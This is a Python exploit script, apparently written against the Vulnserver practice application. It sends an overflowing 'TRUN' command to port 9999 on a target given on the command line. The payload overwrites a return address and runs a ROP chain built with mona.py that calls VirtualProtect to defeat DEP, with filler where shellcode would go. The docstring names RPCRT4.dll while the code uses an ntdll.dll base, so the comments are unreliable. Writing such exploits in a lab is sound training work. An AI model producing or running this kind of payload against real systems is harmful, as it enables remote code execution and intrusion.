#! /bin/python3

'''

Exploit with the knowledge of base address of RPCRT4.dll


'''

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

base = 0x77101000   # base of ntdll.dll on your victim machine

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        base + 0xe6a5a,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x62508128,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        base + 0x6b7f2,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x3d866,  # XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        base + 0x76cbf,  # POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x8a903,  # & call esp [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        base + 0xe18aa,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x74a1a301,  # put delta into eax (-> put 0x00000201 into ebx)
        base + 0x41002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0xd2ea9,  # XCHG EAX,EBX # OR EAX,E58BFFFA # POP EBP # RETN 0x08 [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (compensate)
        #[---INFO:gadgets_to_set_edx:---]
        base + 0x6f173,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x41414141,  # Filler (RETN offset compensation)
        0x41414141,  # Filler (RETN offset compensation)
        0x74a1a140,  # put delta into eax (-> put 0x00000040 into edx)
        base + 0x41002,  # ADD EAX,8B5E5F00 # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x1a6e2,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        base + 0xd64b6,  # POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x124c9f,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        base + 0x79182,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        base + 0x35205,  # RETN (ROP NOP) [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        base + 0x1108d4,  # POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        base + 0x184f1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)

PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # 0x6250129D Address of RETN
    struct.pack('<L', 0x6250129D) +
    create_rop_chain() +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)

